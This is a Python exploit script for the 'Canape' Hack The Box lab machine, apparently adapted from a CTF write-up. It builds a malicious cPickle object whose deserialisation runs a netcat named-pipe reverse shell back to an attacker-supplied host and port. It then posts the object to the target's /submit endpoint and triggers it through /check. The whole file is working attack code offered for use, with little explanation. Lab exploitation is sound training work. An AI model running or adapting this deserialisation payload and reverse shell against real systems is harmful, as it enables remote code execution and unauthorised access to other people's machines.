###Canape cPickle Exploit (run nc -nlvp 1338 separately.)

#Change host/port to your own ip/desired port.
LHOST = "10.10.15.xxx"
LPORT = "1338"

import requests as rq #For posting request
import cPickle #For generating payload
import hashlib #For generating MD5 hash as id
import os #For creating shell object

#Generate payload:
class shell(object):
    def __reduce__(self):
            return (os.system, ("rm /tmp/shell; mknod /tmp/shell p; nc %s %s < /tmp/shell | /bin/bash > /tmp/shell" % (LHOST, LPORT),))
payload = cPickle.dumps(shell())

#Define post parameters.
character = payload+"S'homer'\n"
quote = "quote"
data = {"character":character,"quote":quote}

#Send payload and check reponse.
resp = rq.post('http://10.10.10.70/submit',data=data)
if "Success" in resp.text: print("Successfully posted.")
else: print("Upload error."); sys.exit()

#Calculate and load response page, which in turn triggers the exploit.
p_id = str(hashlib.md5(character+quote).hexdigest())
print("Executing payload...")
rq.post("http://10.10.10.70/check", data={"id":p_id}).text

#original source: https://medium.com/ctf-writeups/canape-write-up-htb-exploiting-cpickle-bad-pip-permissions-d04f101e0228
